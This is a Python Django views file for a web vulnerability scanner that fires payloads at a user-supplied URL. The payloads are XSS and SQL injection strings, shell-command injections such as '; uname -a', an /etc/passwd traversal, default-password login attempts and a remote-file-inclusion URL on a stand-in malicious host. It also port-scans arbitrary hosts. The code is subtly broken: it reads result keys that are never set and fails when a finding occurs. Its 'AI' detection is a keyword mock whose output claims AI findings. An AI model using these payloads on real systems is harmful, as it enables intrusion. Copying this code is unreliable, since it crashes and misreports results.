import socket
from datetime import datetime
from time import time
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup
from django.conf import settings
from django.core.mail import send_mail
from django.db import transaction
from django.shortcuts import get_object_or_404
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

from scannerhandling.models import ScanResult, ContactMessage
from scannerhandling.models import Vulnerability, Feedback


def headers_reader(url, context):
    try:
        response = requests.get(url, timeout=10)
        headers = response.headers

        context['headers'] = {
            'backendTech': "Fingerprinted the Backend Technologies.",
            'host': f"Host: {urlparse(url).netloc}",
            'server': f"WebServer: {headers.get('Server', 'Unknown')}",
            'status': f"Status Code: {response.status_code}",
            'powered': headers.get('X-Powered-By', 'Not Specified'),
            'content_type': headers.get('Content-Type', 'Unknown'),
            'security_headers': {
                'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'Not Set'),
                'Content-Security-Policy': headers.get('Content-Security-Policy', 'Not Set'),
                'X-Frame-Options': headers.get('X-Frame-Options', 'Not Set'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Not Set'),
                'Permissions-Policy': headers.get('Permissions-Policy', 'Not Set'),
                'Referrer-Policy': headers.get('Referrer-Policy', 'Not Set')
            }
        }

    except requests.exceptions.RequestException as e:
        context['headers'] = {'error': f"Failed to connect: {e}"}


def xss_detection(url, context):
    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>"]
    context['xss'] = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?input={payload}")
            if payload in response.text:
                context['xss'].append(payload)
        except requests.RequestException:
            pass

    context['xss'] = "Target is not vulnerable!" if not context[
        'xss'] else f"XSS vulnerability detected with payloads: {context['xss']}"


def sql_injection_detection(url, context):
    payloads = ["' OR '1'='1", "' AND 1=1 --", "' UNION SELECT NULL, version() --"]
    context['sqli'] = []
    for payload in payloads:
        try:
            response = requests.get(f"{url}?id={payload}")
            if "syntax error" in response.text.lower() or "sql" in response.text.lower():
                context['sqli'].append(payload)
        except requests.RequestException:
            pass

    context['sqli'] = "Target is not vulnerable!" if not context[
        'sqli'] else f"SQL Injection vulnerability detected with payloads: {context['sqli']}"


def js_injection_detection(url, context):
    payloads = ["<script>alert('Injected')</script>", "<img src=x onerror=alert('Injected')>",
                "<svg/onload=alert('Injected')>"]
    context['js'] = []
    for payload in payloads:
        try:
            response = requests.post(url, data={"input": payload})
            if payload in response.text:
                context['js'].append(payload)
        except requests.RequestException:
            pass

    context['js'] = "Target is not vulnerable!" if not context[
        'js'] else f"JS Injection vulnerability detected with payloads: {context['js']}"


def remote_code_execution_detection(url, context):
    """
    Tests for Remote Code Execution (RCE) vulnerabilities.
    """
    payloads = ["; uname -a", "; ls", "&& whoami"]
    context['rce'] = "Target is not vulnerable!"
    context['rce_payloads'] = []  # Initialize the payloads used in RCE detection

    for payload in payloads:
        try:
            response = requests.get(f"{url}?cmd={payload}")
            if "root" in response.text or "Linux" in response.text or "user" in response.text:
                context['rce'] = f"RCE vulnerability detected with payload: {payload}"
                context['rce_payloads'].append(payload)  # Track the payload
        except requests.RequestException:
            pass

    # If no payloads were successful, mark as not vulnerable
    if not context['rce_payloads']:
        context['rce_payloads'] = "No successful payloads detected."


def ai_enhanced_vulnerability_detection(url, context):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        content = soup.get_text()

        # Mock AI processing: Replace this with actual AI logic
        if "error" in content.lower() or "warning" in content.lower():
            context['ai_detection'] = "Potential vulnerability detected by AI."
        else:
            context['ai_detection'] = "No vulnerabilities detected by AI."

    except requests.RequestException as e:
        context['ai_detection'] = f"AI analysis failed: {e}"


def port_scanner(url, context):
    """
    Scans a target host for open ports within a specified range.

    Args:
        url: The target URL.
        context: A dictionary to store scan results.

    Returns:
        None. Updates the context with port scanning results.
    """

    host = urlparse(url).netloc
    if ':' in host:
        host = host.split(':')[0]  # Remove port if specified in the URL

    try:
        # Resolve the hostname to an IP address
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        context['ports'] = "Hostname resolution failed for {host}"
        return

    open_ports = []
    start_port = 1
    end_port = 120

    start_time = time()

    for port in range(start_port, end_port + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)  # Set a timeout for each connection attempt

        try:
            s.connect((ip, port))
            open_ports.append(port)
        except:
            pass

        s.close()

    end_time = time()
    elapsed_time = end_time - start_time

    if open_ports:
        context['ports'] = {
            'open_ports': open_ports,
            'elapsed_time': f"Scanning completed in {elapsed_time:.2f} seconds"
        }
    else:
        context['ports'] = {
            'open_ports': "No open ports found.",
            'elapsed_time': f"Scanning completed in {elapsed_time:.2f} seconds"
        }


def directory_traversal_detection(url, context):
    """
    Tests for Directory Traversal vulnerabilities.
    """
    payload = "../../../../etc/passwd"
    context['directory_traversal'] = "Target is not vulnerable!"
    try:
        response = requests.get(f"{url}/{payload}")
        if "root:x" in response.text:
            context['directory_traversal'] = f"Directory Traversal vulnerability detected with payload: {payload}"
    except requests.RequestException:
        pass


def command_injection_detection(url, context):
    """
    Tests for Command Injection vulnerabilities.
    """
    payload = "127.0.0.1; ls"
    context['command_injection'] = "Target is not vulnerable!"
    try:
        response = requests.get(f"{url}?ip={payload}")
        if "index.html" in response.text:
            context['command_injection'] = f"Command Injection vulnerability detected with payload: {payload}"
    except requests.RequestException:
        pass


def server_misconfiguration_detection(url, context):
    """
    Tests for Server Misconfiguration vulnerabilities.
    """
    context['server_misconfiguration'] = "Target is not vulnerable!"
    try:
        response = requests.get(f"{url}/admin", timeout=10)
        if response.status_code == 200:
            context['server_misconfiguration'] = "Server Misconfiguration vulnerability detected: /admin is accessible"
    except requests.RequestException:
        pass


def weak_password_detection(url, context):
    """
    Tests for Weak Passwords vulnerabilities.
    """
    context['weak_passwords'] = "Target is not vulnerable!"
    usernames = ["admin", "root"]
    passwords = ["admin", "password", "123456"]
    detected = []
    for username in usernames:
        for password in passwords:
            try:
                response = requests.post(f"{url}/login", data={"username": username, "password": password})
                if "Login successful" in response.text:
                    detected.append(f"Username: {username}, Password: {password}")
            except requests.RequestException:
                pass
    context['weak_passwords'] = detected or "Target is not vulnerable!"


def web_application_security_detection(url, context):
    """
    Tests for Web Application Security vulnerabilities.
    """
    context['web_security'] = []
    # CSRF detection
    csrf_payload = "<img src='http://malicious-site.com/transfer?amount=1000'>"
    try:
        response = requests.post(f"{url}", data={"name": "John", "comment": csrf_payload})
        if "Transfer successful" in response.text:
            context['web_security'].append("CSRF vulnerability detected")
    except requests.RequestException:
        pass

    # RFI detection
    rfi_payload = "http://malicious-site.com/malicious-script.php"
    try:
        response = requests.get(f"{url}?file={rfi_payload}")
        if "Sensitive information leaked" in response.text:
            context['web_security'].append("Remote File Inclusion (RFI) vulnerability detected")
    except requests.RequestException:
        pass

    if not context['web_security']:
        context['web_security'] = "Target is not vulnerable!"


def save_vulnerability(scan_result, name, description, severity, payload):
    """
    Helper function to save detected vulnerabilities in the database.
    """
    Vulnerability.objects.create(
        scan_result=scan_result,
        name=name,
        description=description,
        severity=severity,
        payload=payload,
    )


def scanner(url, context):
    headers_reader(url, context)
    vulnerabilities_detected = []

    if 'error' not in context['headers']:
        xss_detection(url, context)
        if "XSS vulnerability detected" in context['xss']:
            vulnerabilities_detected.append({
                'name': 'XSS',
                'description': context['xss'],
                'severity': 2,
                'payload': context['xss_payloads'],
            })

        sql_injection_detection(url, context)
        if "SQL Injection vulnerability detected" in context['sqli']:
            vulnerabilities_detected.append({
                'name': 'SQL Injection',
                'description': context['sqli'],
                'severity': 3,
                'payload': context['sqli_payloads'],
            })

        js_injection_detection(url, context)
        if "JS Injection vulnerability detected" in context['js']:
            vulnerabilities_detected.append({
                'name': 'JS Injection',
                'description': context['js'],
                'severity': 2,
                'payload': context['js_payloads'],
            })

        remote_code_execution_detection(url, context)
        if "RCE vulnerability detected" in context['rce']:
            vulnerabilities_detected.append({
                'name': 'Remote Code Execution (RCE)',
                'description': context['rce'],
                'severity': 3,
                'payload': context['rce_payloads'],
            })

        ai_enhanced_vulnerability_detection(url, context)
        if "Potential vulnerability detected by AI" in context['ai_detection']:
            vulnerabilities_detected.append({
                'name': 'AI-Detected Vulnerability',
                'description': context['ai_detection'],
                'severity': 2,
                'payload': None,
            })

        port_scanner(url, context)
        if isinstance(context['ports'], list) and len(context['ports']) > 0:
            vulnerabilities_detected.append({
                'name': 'Open Ports',
                'description': f"Detected open ports: {', '.join([str(p['port']) for p in context['ports']])}",
                'severity': 1,
                'payload': None,
            })
        directory_traversal_detection(url, context)
        if "Directory Traversal vulnerability detected" in context['directory_traversal']:
            vulnerabilities_detected.append({
                'name': 'Directory Traversal',
                'description': context['directory_traversal'],
                'severity': 2,
                'payload': "../../../../etc/passwd",
            })

        command_injection_detection(url, context)
        if "Command Injection vulnerability detected" in context['command_injection']:
            vulnerabilities_detected.append({
                'name': 'Command Injection',
                'description': context['command_injection'],
                'severity': 3,
                'payload': "127.0.0.1; ls",
            })

        server_misconfiguration_detection(url, context)
        if "Server Misconfiguration vulnerability detected" in context['server_misconfiguration']:
            vulnerabilities_detected.append({
                'name': 'Server Misconfiguration',
                'description': context['server_misconfiguration'],
                'severity': 2,
            })

        weak_password_detection(url, context)
        if isinstance(context['weak_passwords'], list):
            vulnerabilities_detected.append({
                'name': 'Weak Passwords',
                'description': f"Weak passwords detected: {', '.join(context['weak_passwords'])}",
                'severity': 2,
            })

        web_application_security_detection(url, context)
        if isinstance(context['web_security'], list):
            vulnerabilities_detected.append({
                'name': 'Web Application Security',
                'description': "Web application vulnerabilities detected.",
                'severity': 3,
                'payload': context['web_security'],
            })

        # Save results to database
        with transaction.atomic():
            scan_result = ScanResult.objects.create(
                url=url,
                headers=context['headers'],
                vulnerabilities={
                    'xss': context.get('xss', 'Not tested'),
                    'sql_injection': context.get('sqli', 'Not tested'),
                    'js_injection': context.get('js', 'Not tested'),
                    'rce': context.get('rce', 'Not tested'),
                    'ports': context.get('ports', 'Not tested'),
                    'directory_traversal': context.get('directory_traversal', 'Not tested'),
                    'command_injection': context.get('command_injection', 'Not tested'),
                    'server_misconfiguration': context.get('server_misconfiguration', 'Not tested'),
                    'weak_passwords': context.get('weak_passwords', 'Not tested'),
                    'web_security': context.get('web_security', 'Not tested'),
                },
                scan_date=datetime.now()
            )

            for vuln in vulnerabilities_detected:
                save_vulnerability(
                    scan_result=scan_result,
                    name=vuln['name'],
                    description=vuln['description'],
                    severity=vuln['severity'],
                    payload=vuln.get('payload'),
                )


# Django View for Displaying Results
def home(request):
    return render(request, 'home.html')

def scanning(request):
    url = request.POST.get('url', '').strip()
    if not url:
        return render(request, 'home.html', {"error": "No URL found."})

    context = {'url': url}
    print("start scanning")
    scanner(url, context)
    print("finish scanning")
    if 'error' in context['headers']:
        return render(request, 'home.html', {"error": context['headers']['error']})
    return render(request, 'output.html', context)

def about_us(request):
    return render(request, 'about_us.html')


def feedback(request):
    if request.method == 'POST':
        vulnerability_id = request.POST.get('vulnerability_id')
        feedback_text = request.POST.get('feedback')
        if vulnerability_id is None or feedback_text is None:
            return render(request, 'feedback.html', {'feedback_text': "The vulnerability exists"})
        # Ensure the vulnerability exists
        vulnerability = get_object_or_404(Vulnerability, id=vulnerability_id)

        # Create the feedback record
        Feedback.objects.create(vulnerability=vulnerability, feedback_text=feedback_text)
        return render(request, 'feedback.html', {'message': 'Feedback submitted successfully'})

    vulnerabilities = Vulnerability.objects.all()
    return render(request, 'feedback.html', {'vulnerabilities': vulnerabilities})


import os
OPENAI_API_KEY = os.getenv("OPENAI_API_KEY")

def generate_custom_report(request):
    report = None
    if request.method == 'POST':
        details = request.POST.get('details', '')

        # Your API logic here
        url = "https://api.openai.com/v1/chat/completions"
        payload = {
            "model": "gpt-4o-mini",
            "messages": [
                {"role": "system", "content": "You are an assistant for generating professional reports."},
                {"role": "user", "content": f"Generate a professional report based on: {details}"}
            ]
        }
        headers = {
            "Authorization": f"Bearer {OPENAI_API_KEY}",
            "Content-Type": "application/json"
        }
        response = requests.post(url, json=payload, headers=headers)
        if response.status_code == 200:
            data = response.json()
            report = data["choices"][0]["message"]["content"]
        else:
            report = "An error occurred. Please try again."

    return render(request, 'generate_custom_report.html', {'report': report})


def contact_us(request):
    if request.method == 'POST':
        name = request.POST.get('name')
        email = request.POST.get('email')
        subject = request.POST.get('subject', 'No Subject')
        message = request.POST.get('message')

        # Save the message in the database
        ContactMessage.objects.create(
            name=name,
            email=email,
            subject=subject,
            message=message
        )

        # Send email to admin
        admin_email = settings.EMAIL_HOST_USER
        email_subject = f"New Contact Message: {subject}"
        email_message = (
            f"You have received a new message from your contact form:\n\n"
            f"Name: {name}\n"
            f"Email: {email}\n"
            f"Subject: {subject}\n\n"
            f"Message:\n{message}\n"
        )

        try:
            send_mail(
                email_subject,
                email_message,
                settings.EMAIL_HOST_USER,
                [admin_email],
                fail_silently=False,
            )
            success_message = 'Your message has been sent successfully. We will get back to you soon!'
        except Exception:
            success_message = 'There was an error sending your message. Please try again later.'

        return render(request, 'contact_us.html', {'success_message': success_message})

    return render(request, 'contact_us.html')


@csrf_exempt
def port_scan(request):
    if request.method == 'POST':
        host = request.POST.get('host', '').strip()  # Get the host dynamically from the frontend
        open_ports = []
        start_port = 1
        end_port = 512  # Adjust the range as needed

        if not host:
            return render(request, 'port_scan_results.html', {'error': 'Please provide a valid host'})
        host = urlparse(host).netloc
        if ':' in host:
            host = host.split(':')[0]  # Remove port if specified in the URL
        try:
            # Resolve the hostname to an IP address
            ip = socket.gethostbyname(host)
        except socket.gaierror:
            return render(request, 'port_scan_results.html', {'error': f"Hostname resolution failed for {host}"})
        try:
            start_time = time()
            for port in range(start_port, end_port + 1):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)  # Set a timeout for each connection attempt

                try:
                    s.connect((ip, port))
                    open_ports.append(port)
                except:
                    pass

                s.close()
            end_time = time()
            elapsed_time = end_time - start_time
        except socket.gaierror:
            return render(request, 'port_scan_results.html', {'error': f'Hostname resolution failed for {host}'})
        except Exception as e:
            return render(request, 'port_scan_results.html', {'error': f'Error occurred: {str(e)}'})

        return render(request, 'port_scan_results.html', {'host': host, 'ports': open_ports,
                                                          'elapsed_time': f"Scanning completed in {elapsed_time:.2f} seconds"})

    return render(request, 'port_scan_results.html', {'error': 'No scan initiated'})
